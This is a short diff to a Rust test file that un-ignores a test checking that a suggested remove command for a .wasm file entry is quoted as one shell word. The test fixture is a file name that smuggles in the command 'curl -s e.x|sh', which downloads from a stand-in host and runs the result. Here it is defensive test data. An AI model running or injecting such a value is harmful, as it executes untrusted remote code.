@@ -45,7 +45,6 @@ fn assert_refused_over(entries: &[&str]) {
     behavior = "add_extension_to_existing_project",
     verify = "an add refused over a .wasm file entry names the remove of that entry as one shell word"
 )]
-#[ignore = "flipped by T6"]
 fn the_remove_an_add_over_a_file_entry_names_is_one_shell_word() {
     let entry = "g.wasm; curl -s e.x|sh; .wasm";
     let dir = project_enabling(&[entry]);
